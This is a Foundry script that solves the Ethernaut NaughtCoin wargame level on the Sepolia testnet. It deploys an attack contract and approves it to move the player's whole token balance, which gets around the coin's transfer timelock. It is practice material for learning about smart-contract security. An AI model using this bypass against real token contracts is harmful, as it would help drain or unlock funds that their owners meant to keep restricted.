// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

import "../src/Cracked15_NaughtCoin.sol";

//forge script  --rpc-url sepolia --account metamask  Cracked15_NaughtCoinScript --broadcast
contract Cracked15_NaughtCoinScript is Script {
    address ethernaut_contracts;
    Cracked15_NaughtCoin attack;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("NaughtCoin_address"));
    }

    function run() public {
        vm.startBroadcast();
        attack = new Cracked15_NaughtCoin(ethernaut_contracts);
        address player = vm.parseAddress(vm.envString("player"));
        uint256 oldBal = INaughtCoin(ethernaut_contracts).balanceOf(player);
        console.log("player oldBal is", oldBal);
        INaughtCoin(ethernaut_contracts).approve(address(attack), oldBal);
        attack.transfer(oldBal);
        uint256 newBal = INaughtCoin(ethernaut_contracts).balanceOf(player);
        console.log("player newBal is", newBal);
        require(newBal == 0, "FAIL");
        vm.stopBroadcast();
    }
}
